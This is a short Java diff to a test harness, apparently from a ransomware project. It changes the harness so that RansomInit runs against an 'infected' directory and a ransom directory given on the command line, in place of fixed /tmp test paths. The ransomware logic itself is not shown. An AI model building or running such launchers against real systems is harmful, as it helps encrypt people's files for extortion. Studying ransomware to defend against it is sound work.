@@ -15,9 +15,12 @@ public class TestRansom {
 
 	public static void main(String[] args) {
 		String dir = "/tmp/keys";
+		String infectedDir=args[0];
+		String ransomDir=args[1];
+		String keys=args[2];
 		PrivateKey pk = generateKeyPair(dir);
 		RansomInit ransom = new RansomInit();
-		String[] argv = { "/tmp/ransom/", "/tmp/ransomTest/", Base64.getEncoder().encodeToString(pk.getEncoded())};
+		String[] argv = { infectedDir, ransomDir, Base64.getEncoder().encodeToString(pk.getEncoded())};
 		ransom.main(argv);
 
 	}
